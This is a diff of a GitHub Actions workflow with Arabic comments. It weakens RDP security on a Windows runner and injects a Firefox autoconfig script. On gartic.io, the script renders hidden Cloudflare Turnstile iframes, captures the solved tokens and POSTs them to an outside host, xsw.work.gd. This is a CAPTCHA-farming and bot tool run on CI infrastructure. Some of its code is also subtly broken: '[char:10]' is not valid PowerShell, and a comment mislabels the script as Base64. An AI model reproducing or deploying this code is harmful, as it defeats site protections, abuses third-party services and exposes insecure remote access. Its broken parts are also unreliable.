@@ -24,19 +24,47 @@ jobs:
           Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -Name "UserAuthentication" -Value 0 -Force
           netsh advfirewall firewall add rule name="Allow-RDP" dir=in action=allow protocol=TCP localport=3389
 
-      - name: 2. Inject Gartic Script (Base64 Method)
+      - name: 2. Inject Gartic Script (Fixed Quotes)
         run: |
           $firefoxDir = "C:\Program Files\Mozilla Firefox"
           if (!(Test-Path "$firefoxDir\defaults\pref")) { New-Item -ItemType Directory -Force -Path "$firefoxDir\defaults\pref" }
           
-          # إعدادات الفايرفوكس
-          $pref = 'pref("general.config.filename", "mozilla.cfg");' + "`n" + 'pref("general.config.obscure_value", 0);'
+          # إعدادات ملف التعريف
+          $pref = 'pref("general.config.filename", "mozilla.cfg");' + [char:10] + 'pref("general.config.obscure_value", 0);'
           $pref | Out-File "$firefoxDir\defaults\pref\local-settings.js" -Encoding ASCII -Force
 
-          # السكربت الخاص بك مشفر (Base64) لمنع أخطاء YAML
-          $base64Script = "try { window.addEventListener('load', function() { if (location.href.includes('gartic.io')) { setInterval(() => { location.reload(); }, 50000); function sendToken(t) { if (typeof t !== 'string' || t.length <= 20) return; fetch('https://www.xsw.work.gd/add-token', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: t }) }).catch(() => {}); } window.addEventListener('message', function(e) { if (e.data && typeof e.data === 'string') { sendToken(e.data); } }); for (let i = 0; i < 6; i++) { const f = document.createElement('iframe'); f.style.display = 'none'; f.sandbox = 'allow-scripts allow-same-origin'; document.body.appendChild(f); f.srcdoc = '<!DOCTYPE html><html><head><script src=\"https://challenges.cloudflare.com/turnstile/v0/api.js\" async defer></script></head><body><div id=\"cf-turnstile\"></div><script>function r(){try{window.turnstile.render(\"#cf-turnstile\",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>'; } } }); } catch (e) {}"
-          
-          $cfgContent = "//`n" + $base64Script
+          # كود الـ HTML الخاص بالـ Turnstile (مفصول لضمان عدم حدوث خطأ)
+          $htmlContent = '<!DOCTYPE html><html><head><script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script></head><body><div id="cf-turnstile"></div><script>function r(){try{window.turnstile.render("#cf-turnstile",{sitekey:\"0x4AAAAAABBPKaIbNwnPEfSo\",callback:function(t){parent.postMessage(t,\"*\");}});}catch(e){}}setInterval(r,3500);setTimeout(r,200);</script></body></html>'
+
+          # كود السكربت كاملاً
+          $script = @"
+          try {
+              window.addEventListener('load', function() {
+                  if (location.href.includes('gartic.io')) {
+                      setInterval(function() { location.reload(); }, 50000);
+                      function sendToken(t) {
+                          if (typeof t !== 'string' || t.length <= 20) return;
+                          fetch('https://www.xsw.work.gd/add-token', {
+                              method: 'POST',
+                              headers: { 'Content-Type': 'application/json' },
+                              body: JSON.stringify({ token: t })
+                          }).catch(function() {});
+                      }
+                      window.addEventListener('message', function(e) {
+                          if (e.data && typeof e.data === 'string') { sendToken(e.data); }
+                      });
+                      for (var i = 0; i < 6; i++) {
+                          var f = document.createElement('iframe');
+                          f.style.display = 'none';
+                          f.sandbox = 'allow-scripts allow-same-origin';
+                          document.body.appendChild(f);
+                          f.srcdoc = '$htmlContent';
+                      }
+                  }
+              });
+          } catch (e) {}
+"@
+          $cfgContent = "//" + [char:10] + $script
           $cfgContent | Out-File "$firefoxDir\mozilla.cfg" -Encoding ASCII -Force
 
       - name: 3. Create RDP User
